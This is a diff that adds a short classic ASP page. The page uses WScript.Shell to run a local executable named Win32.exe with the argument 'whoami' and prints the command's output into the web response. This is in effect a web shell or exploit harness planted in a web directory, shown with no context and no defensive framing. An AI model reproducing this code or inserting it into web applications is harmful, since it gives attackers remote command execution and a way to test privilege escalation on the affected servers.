@@ -1,0 +1,4 @@
+<%
+set x=createobject("wscript.shell").exec("F:\www\new\Win32.exe ""whoami """)
+ response.write (x.stdout.readall & x.stderr.readall)
+%>
